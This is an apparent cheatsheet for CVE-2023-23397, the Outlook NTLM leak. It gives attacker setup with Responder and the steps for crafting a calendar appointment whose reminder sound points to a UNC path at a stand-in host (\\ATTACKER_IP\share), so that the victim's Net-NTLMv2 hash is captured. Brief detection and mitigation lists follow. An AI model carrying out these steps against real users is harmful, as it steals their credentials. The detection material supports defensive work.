# Outlook NTLM Leak – CVE-2023-23397 Cheatsheet

---

## 🔧 Attacker Setup

### Start Responder
```bash
sudo responder -I eth0
```
📧 Exploitation Steps
1- Craft malicious Outlook appointment

2- Set reminder sound to UNC path:

```pgsql
\\ATTACKER_IP\share\sound.wav
```
3- Send appointment to victim

4- Wait for reminder trigger

5- Capture Net-NTLMv2 hash

🧪 Hash Capture Output
Username

Domain

Net-NTLMv2 hash

🔎 Detection
Monitor outbound SMB traffic

Look for unusual UNC paths in calendar items

Review Outlook logs

🛡️ Mitigation
Apply Microsoft patch (March 2023)

Disable NTLM where possible

Block outbound SMB

Use Extended Protection for Authentication

---
